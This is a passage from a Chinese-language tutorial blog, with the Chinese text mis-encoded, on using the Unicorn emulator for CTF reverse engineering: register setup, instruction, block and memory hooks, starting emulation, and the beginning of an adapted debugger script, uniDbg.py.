uc.reg_write(UC_X86_REG_R9, R9_DATA)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R10, R10_DATA)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R11, R11_DATA)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R12, R12_DATA)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R13, R13_DATA)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R14, R14_DATA)</span><br><span class="line">    uc.reg_write(UC_X86_REG_R15, R15_DATA)</span><br><span class="line">    uc.reg_write(UC_X86_REG_RSP, STACK + <span class="number">0x1000</span>)</span><br></pre></td></tr></table></div></figure>


        <h3 id="4-å…¶ä»–å¸¸ç”¨åŠŸèƒ½å‡½æ•°"   >
          <a href="#4-å…¶ä»–å¸¸ç”¨åŠŸèƒ½å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-å…¶ä»–å¸¸ç”¨åŠŸèƒ½å‡½æ•°" class="headerlink" title="(4)å…¶ä»–å¸¸ç”¨åŠŸèƒ½å‡½æ•°"></a>(4)å…¶ä»–å¸¸ç”¨åŠŸèƒ½å‡½æ•°</h3>
      
        <h4 id="â‘ ä»binaryä¸­è·å–ä»£ç "   >
          <a href="#â‘ ä»binaryä¸­è·å–ä»£ç " class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ ä»binaryä¸­è·å–ä»£ç " class="headerlink" title="â‘ ä»binaryä¸­è·å–ä»£ç "></a>â‘ ä»binaryä¸­è·å–ä»£ç </h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCODEFromBinary</span>(<span class="params">binary</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(binary, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        CODE_DATA = f.read()</span><br><span class="line">    <span class="keyword">return</span> CODE_DATA</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡å•æ­¥æ˜¾ç¤ºç»“æœ"   >
          <a href="#â‘¡å•æ­¥æ˜¾ç¤ºç»“æœ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡å•æ­¥æ˜¾ç¤ºç»“æœ" class="headerlink" title="â‘¡å•æ­¥æ˜¾ç¤ºç»“æœ"></a>â‘¡å•æ­¥æ˜¾ç¤ºç»“æœ</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_OneStep</span>(<span class="params">uc, address, size, user_data</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot;</span> %(address, size))</span><br><span class="line">    <span class="comment">#åˆ©ç”¨retæ¥è·³è¿‡printfå‡½æ•°ï¼Œç±»ä¼¼è¿˜å¯ä»¥è·³è¿‡å…¶ä»–å‡½æ•°</span></span><br><span class="line">    <span class="keyword">if</span> address == <span class="number">0x640</span>:  <span class="comment"># printf</span></span><br><span class="line">        rsp = uc.reg_read(UC_X86_REG_RSP)</span><br><span class="line">        retn_addr = u64(uc.mem_read(rsp,<span class="number">8</span>))</span><br><span class="line">        uc.reg_write(UC_X86_REG_RIP, retn_addr)</span><br><span class="line">    <span class="comment">#è·³è¿‡æŸæ¡æŒ‡ä»¤ï¼Œè¿™é‡Œè·³è¿‡rdrand raxæŒ‡ä»¤</span></span><br><span class="line">    <span class="keyword">if</span> code == <span class="string">b&quot;\x48\x0F\xC7\xF0&quot;</span>:</span><br><span class="line">        uc.reg_write(UC_X86_REG_RIP, address + <span class="number">4</span>)</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åè¿™ä¸ªéœ€è¦åœ¨ä¹‹ååŠ å…¥åˆ°ucçš„å›è°ƒå‡½æ•°ä¸­ï¼Œä¸€èˆ¬åœ¨mainå‡½æ•°ä¸­æ·»åŠ ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uc.hook_add(UC_HOOK_CODE, hook_OneStep, <span class="literal">None</span>, CODE, <span class="built_in">len</span>(CODE_DATA))</span><br></pre></td></tr></table></div></figure>

<p>æ·»åŠ hook_OneStepå‡½æ•°ï¼Œä½¿å¾—<code>CODE~CODE+len(CODE_DATA)</code>ä¸­æ¯æ¡æŒ‡ä»¤æ‰§è¡Œæ—¶éƒ½è°ƒç”¨è¯¥hook_OneStepå‡½æ•°ï¼Œä¾¿äºæˆ‘ä»¬è§‚å¯Ÿè¿è¡Œè¿‡ç¨‹ã€‚</p>

        <h4 id="â‘¢æ•´å—æ˜¾ç¤ºç»“æœ"   >
          <a href="#â‘¢æ•´å—æ˜¾ç¤ºç»“æœ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢æ•´å—æ˜¾ç¤ºç»“æœ" class="headerlink" title="â‘¢æ•´å—æ˜¾ç¤ºç»“æœ"></a>â‘¢æ•´å—æ˜¾ç¤ºç»“æœ</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_block</span>(<span class="params">uc, address, size, user_data</span>):</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Tracing basic block at 0x%x, block size = 0x%x&quot;</span> % (address, size))</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªä¹Ÿæ˜¯éœ€è¦æ·»åŠ çš„</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uc.hook_add(UC_HOOK_BLOCK, hook_block)</span><br></pre></td></tr></table></div></figure>

<p>æˆ‘ä»¬è¿è¡Œä»£ç å¯ä»¥æ˜¯ä¸€å—ä¸€å—çš„ï¼š</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿è¡Œä¸€æ®µä»£ç </span></span><br><span class="line">uc.emu_start(CODE, CODE + <span class="number">0x7</span>*<span class="number">2</span>)</span><br><span class="line">uc.emu_start(CODE + <span class="number">0x7</span> * <span class="number">2</span>, CODE + <span class="number">0x7</span> * <span class="number">4</span>)</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªæ•´å—çš„blockå‡½æ•°å°±æ˜¯ç”¨åœ¨æ¯å—ä»£ç å¼€å§‹çš„æ—¶å€™è¿è¡Œè¯¥å—å‡½æ•°</p>

        <h4 id="â‘£æ— æ•ˆå†…å­˜è®¿é—®çš„å›è°ƒå‡½æ•°"   >
          <a href="#â‘£æ— æ•ˆå†…å­˜è®¿é—®çš„å›è°ƒå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘£æ— æ•ˆå†…å­˜è®¿é—®çš„å›è°ƒå‡½æ•°" class="headerlink" title="â‘£æ— æ•ˆå†…å­˜è®¿é—®çš„å›è°ƒå‡½æ•°"></a>â‘£æ— æ•ˆå†…å­˜è®¿é—®çš„å›è°ƒå‡½æ•°</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_MemInvalid</span>(<span class="params">uc, access, address, size, value, user_data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> access == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Missing memory is being WRITE at 0x%x, data size = %u, data value = 0x%x&quot;</span>%(address, size, value))</span><br><span class="line">        <span class="comment"># map this memory in with 2MB in size</span></span><br><span class="line">        uc.mem_map(<span class="number">0xaaaa0000</span>, <span class="number">2</span> * <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">        <span class="comment"># return True to indicate we want to continue emulation</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># return False to indicate we want to stop emulation</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#uc.hook_add(UC_HOOK_MEM_READ_UNMAPPED | UC_HOOK_MEM_WRITE_UNMAPPED, hook_MemInvalid)</span></span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¤å†…å­˜è®¿é—®çš„å›è°ƒå‡½æ•°"   >
          <a href="#â‘¤å†…å­˜è®¿é—®çš„å›è°ƒå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¤å†…å­˜è®¿é—®çš„å›è°ƒå‡½æ•°" class="headerlink" title="â‘¤å†…å­˜è®¿é—®çš„å›è°ƒå‡½æ•°"></a>â‘¤å†…å­˜è®¿é—®çš„å›è°ƒå‡½æ•°</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_MemAccess</span>(<span class="params">uc, access, address, size, value, user_data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> access == UC_MEM_WRITE:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Memory is being WRITE at 0x%x, data size = %u, data value = 0x%x&quot;</span>%(address, size, value))</span><br><span class="line">    <span class="keyword">else</span>:   <span class="comment"># READ</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Memory is being READ at 0x%x, data size = %u&quot;</span>%(address, size))</span><br><span class="line"></span><br><span class="line"><span class="comment">#uc.hook_add(UC_HOOK_MEM_WRITE, hook_MemAccess)</span></span><br><span class="line"><span class="comment">#uc.hook_add(UC_HOOK_MEM_READ, hook_MemAccess)</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="2-å¯åŠ¨unicorn"   >
          <a href="#2-å¯åŠ¨unicorn" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¯åŠ¨unicorn" class="headerlink" title="2.å¯åŠ¨unicorn"></a>2.å¯åŠ¨unicorn</h2>
      <p>é€šå¸¸ä½¿ç”¨å¦‚ä¸‹ä»£ç å¯åŠ¨</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># è¿è¡Œä¸€æ®µä»£ç </span></span><br><span class="line">    uc.emu_start(CODE, CODE + <span class="number">0x7</span>*<span class="number">3</span>)</span><br><span class="line">    uc.emu_start(CODE + <span class="number">0x7</span> * <span class="number">3</span>, CODE + <span class="number">0x7</span> * <span class="number">4</span>)</span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå°±ä»£è¡¨è¿è¡Œäº†ä¸¤å—ä»£ç ï¼Œåˆ†åˆ«ä¸º<code>CODE  ~ CODE + 0x7*3</code>å’Œ<code>CODE + 0x7 * 3  ~  CODE + 0x7 * 4</code></p>
<p>å‚è€ƒï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246451" >ä½¿ç”¨unicornæ¥è‡ªåŠ¨åŒ–è§£é¢˜ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>CTFWIKI</p>

        <h2 id="3-è°ƒè¯•å™¨"   >
          <a href="#3-è°ƒè¯•å™¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è°ƒè¯•å™¨" class="headerlink" title="3.è°ƒè¯•å™¨"></a>3.è°ƒè¯•å™¨</h2>
      
        <h3 id="è¯¦æƒ…å‚è€ƒï¼š"   >
          <a href="#è¯¦æƒ…å‚è€ƒï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#è¯¦æƒ…å‚è€ƒï¼š" class="headerlink" title="è¯¦æƒ…å‚è€ƒï¼š"></a>è¯¦æƒ…å‚è€ƒï¼š</h3>
      <p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-253868.htm" >åŸåˆ›] Unicorn åœ¨ Android çš„åº”ç”¨-Androidå®‰å…¨-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>è¿™é‡Œå°†ä¸€äº›ä¸œè¥¿æ”¹äº†ä¸‹ï¼ŒåŸæœ¬<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/user-617255.htm" >æ— åä¾ å¸ˆå‚…</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>çš„è°ƒè¯•å™¨ä»£ç ä¸­å°±è‡ªå¸¦ä¸åŒARCHå’ŒMODEï¼Œåªä¸è¿‡åˆ†äº«ä¸Šè¿°æ–‡ç« æ—¶ï¼Œæ”¹æ‰äº†åªæœ‰ARMï¼Œè¿™é‡Œæˆ‘åŠ äº†å›å»ï¼Œé¡ºå¸¦åŠ å…¥äº†mipsæ¶æ„ï¼Œå¦å¤–è¿˜åŠ äº†ä¸€äº›ä¸ªäººå¸¸ç”¨çš„å‘½ä»¤ï¼Œå¹¶ä¸”åœ¨linuxä¸‹çš„æŸäº›<code>\n</code>æ¢è¡Œé—®é¢˜(splitå‡½æ•°)ï¼Œè¿™é‡Œä¹Ÿä¸€å¹¶ä¿®æ”¹äº†ã€‚ç„¶åä»ä¸€ä¸ªPWNé€‰æ‰‹çš„è§’åº¦ï¼ŒåŠ äº†ä¸€ç‚¹åŠŸèƒ½ï¼Œè¾“å…¥helpæŸ¥çœ‹æ‰€æœ‰åŠŸèƒ½</p>

        <h4 id="uniDbg-py"   >
          <a href="#uniDbg-py" class="heading-link"><i class="fas fa-link"></i></a><a href="#uniDbg-py" class="headerlink" title="uniDbg.py"></a>uniDbg.py</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> uniDbg_REG <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">import</span> capstone <span class="keyword">as</span> cp</span><br><span class="line"></span><br><span class="line">BPT_EXECUTE = <span class="number">1</span></span><br><span class="line">BPT_MEMREAD = <span class="number">2</span></span><br><span class="line">UDBG_MODE_ALL = <span class="number">1</span></span><br><span class="line">UDBG_MODE_FAST = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2int</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> s.startswith(<span class="string">&#x27;0x&#x27;</span>) <span class="keyword">or</span> s.startswith(<span class="string">&quot;0X&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(s[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">numToStr</span>(<span class="params">num</span>):</span></span><br><span class="line">    amountByte = <span class="number">0</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">0</span>):</span><br><span class="line">            amountByte = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> (num &gt;= <span class="built_in">pow</span>(<span class="number">16</span>, amountByte * <span class="number">2</span>)):</span><br><span class="line">            amountByte += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, amountByte + <span class="number">1</span>):</span><br><span class="line">        newNum = num &gt;&gt; <span class="number">8</span></span><br><span class="line">        myChr = num - newNum * <span class="number">0x100</span></span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(myChr)</span><br><span class="line">        num = newNum</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">reversed</span>(<span class="built_in">str</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">advance_dump</span>(<span class="params">data, base</span>):</span></span><br><span class="line">    PY3K = sys.version_info &gt;= (<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    generator = hexdump.genchunks(data, <span class="number">16</span>)</span><br><span class="line">    retstr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> addr, d <span class="keyword">in</span> <span class="built_in">enumerate</span>(generator):</span><br><span class="line">        <span class="comment"># 00000000:</span></span><br><span class="line">        line = <span class="string">&#x27;%08X: &#x27;</span> % (base + addr * <span class="number">16</span>)</span><br><span class="line">        <span class="comment"># 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00</span></span><br><span class="line">        dumpstr = hexdump.dump(d)</span><br><span class="line">        line += dumpstr[:<span class="number">8</span> * <span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(d) &gt; <span class="number">8</span>:  <span class="comment"># insert separator if needed</span></span><br><span class="line">            line += <span class="string">&#x27; &#x27;</span> + dumpstr[<span class="number">8</span> * <span class="number">3</span>:]</span><br><span class="line">        <span class="comment"># ................</span></span><br><span class="line">        <span class="comment"># calculate indentation, which may be different for the last line</span></span><br><span class="line">        pad = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(d) &lt; <span class="number">16</span>:</span><br><span class="line">            pad += <span class="number">3</span> * (<span class="number">16</span> - <span class="built_in">len</span>(d))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(d) &lt;= <span class="number">8</span>:</span><br><span class="line">            pad += <span class="number">1</span></span><br><span class="line">        line += <span class="string">&#x27; &#x27;</span> * pad</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> d:</span><br><span class="line">            <span class="comment"># printable ASCII range 0x20 to 0x7E</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> PY3K:</span><br><span class="line">                byte = <span class="built_in">ord</span>(byte)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0x20</span> &lt;= byte &lt;= <span class="number">0x7E</span>:</span><br><span class="line">                line += <span class="built_in">chr</span>(byte)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line += <span class="string">&#x27;.&#x27;</span></span><br><span class="line">        retstr += line + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> retstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_dbg_trace</span>(<span class="params">mu, address, size, self</span>):</span></span><br><span class="line">    self._tracks.append(address)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self._is_step <span class="keyword">and</span> self._tmp_bpt == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> address <span class="keyword">not</span> <span class="keyword">in</span> self._list_bpt:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self._tmp_bpt != address <span class="keyword">and</span> self._tmp_bpt != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _dbg_trace_internal(mu, address, size, self)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_dbg_memory</span>(<span class="params">mu, access, address, length, value, self</span>):</span></span><br><span class="line">    pc = mu.reg_read(arm_const.UC_ARM_REG_PC)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;memory error: pc: %x access: %x address: %x length: %x value: %x&quot;</span> %</span><br><span class="line">          (pc, access, address, 